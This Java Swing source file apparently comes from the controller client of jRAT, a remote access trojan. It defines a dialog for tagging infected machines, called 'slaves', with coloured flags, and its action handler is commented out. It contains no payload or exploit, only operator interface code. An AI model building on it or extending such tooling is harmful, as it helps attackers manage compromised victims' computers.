package su.jrat.client.ui.dialogs;

import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.List;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.border.EmptyBorder;

import su.jrat.client.Slave;
import su.jrat.client.ui.renderers.JComboBoxIconRenderer;
import su.jrat.client.utils.IconUtils;


@SuppressWarnings("serial")
public class DialogFlag extends BaseDialog {

	private JPanel contentPane;
	public List<Slave> slaves;

	@SuppressWarnings({ "unchecked", "rawtypes" })
	public DialogFlag(List<Slave> list) {
		super();
		this.slaves = list;
		setIconImage(Toolkit.getDefaultToolkit().getImage(DialogFlag.class.getResource("/icons/flag_green.png")));
		setTitle("Flag");
		if (slaves.size() > 1) {
			setTitle("Flag " + slaves.size() + " slaves");
		} else {
			setTitle("Flag " + slaves.size() + " slave");
		}
		setResizable(false);
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 249, 136);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);

		String p = "flag_";

		final JComboBox comboBox = new JComboBox(new Object[] { "red", "green", "blue", "white", "orange" });
		JComboBoxIconRenderer renderer = new JComboBoxIconRenderer();

		renderer.addIcon("red", IconUtils.getIcon(p + "red", true));
		renderer.addIcon("blue", IconUtils.getIcon(p + "blue", true));
		renderer.addIcon("green", IconUtils.getIcon(p + "green", true));
		renderer.addIcon("white", IconUtils.getIcon(p + "white", true));
		renderer.addIcon("orange", IconUtils.getIcon(p + "orange", true));

		comboBox.setRenderer(renderer);

		JLabel lblColor = new JLabel("Color:");

		JButton btnFlag = new JButton("Flag");
		btnFlag.setIcon(new ImageIcon(DialogFlag.class.getResource("/icons/enabled.png")));
		btnFlag.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				/*
				 * String selected = comboBox.getSelectedItem().toString(); for
				 * (Slave sl : slaves) { sl.flagged = !sl.flagged; int row =
				 * Util.getRow(3, sl.ip); if (row == -1) { continue; } if
				 * (sl.flagged) { Frame.model.setValueAt(Util.getIcon("flag_" +
				 * selected, true), row, 0); } else {
				 * Frame.model.setValueAt(Util.getCountry(sl.ip), row, 0); } }
				 * Frame.table.repaint(); exit();
				 */
				// TODO FIX
			}
		});

		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING).addGroup(gl_contentPane.createSequentialGroup().addContainerGap().addComponent(lblColor).addPreferredGap(ComponentPlacement.RELATED).addComponent(comboBox, GroupLayout.PREFERRED_SIZE, 114, GroupLayout.PREFERRED_SIZE).addContainerGap(76, Short.MAX_VALUE)).addGroup(gl_contentPane.createSequentialGroup().addContainerGap(142, Short.MAX_VALUE).addComponent(btnFlag, GroupLayout.PREFERRED_SIZE, 81, GroupLayout.PREFERRED_SIZE).addContainerGap()));
		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addContainerGap().addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(lblColor).addComponent(comboBox, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)).addPreferredGap(ComponentPlacement.RELATED, 31, Short.MAX_VALUE).addComponent(btnFlag).addContainerGap()));
		contentPane.setLayout(gl_contentPane);
		btnFlag.requestFocus();
	}

	public void exit() {
		setVisible(false);
		dispose();
	}
}
